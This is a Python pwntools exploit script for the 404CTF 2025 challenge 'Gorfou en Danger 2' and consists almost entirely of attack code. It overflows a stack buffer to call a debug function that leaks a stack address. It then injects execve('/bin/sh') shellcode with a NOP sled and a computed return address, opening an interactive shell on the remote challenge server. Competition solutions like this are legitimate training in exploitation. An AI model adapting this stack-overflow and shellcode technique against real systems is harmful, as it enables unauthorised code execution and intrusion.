#!/usr/bin/env python3

# Author: Pwnsard
# Challenge: Gorfou en Danger 2
# CTF: 404CTF 2025

from pwn import *

exe = ELF(b'data/chall')

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        return r
    else:
        return remote('challenges.404ctf.fr', 32464)
    
def generate_shellcode():
    shellcode_asm = """
        xor     rdx, rdx
        movabs  rbx, 0x68732f6e69622fff
        shr     rbx, 8
        push    rbx
        mov     rdi, rsp
        xor     rax, rax
        push    rax
        push    rdi
        mov     rsi, rsp
        mov     al, 0x3b
        syscall 
        push    1
        pop     rdi
        push    0x3c
        pop     rax
        syscall 
	"""
    shellcode = asm(shellcode_asm, bits=64)
    return shellcode


def main():
    global r 
    r = conn()

    shellcode = generate_shellcode()

    r.recvuntil(b"> ")

    print(len(shellcode))

    r.send(b"A" * (0x100 + 8) + p64(exe.symbols['debug_info']) + p64(exe.symbols['take_command']))

    r.recvuntil(b"Stack address : ")
    leak = int(r.recvline(), 16)
    print(f"leak@{hex(leak - 0x90)}")

    r.recvuntil(b"> ")

    r.send(shellcode + (b"\x90" * ((0x108) - len(shellcode))) + p64(leak - 0xf0))

    r.interactive()

if __name__ == '__main__':
    main()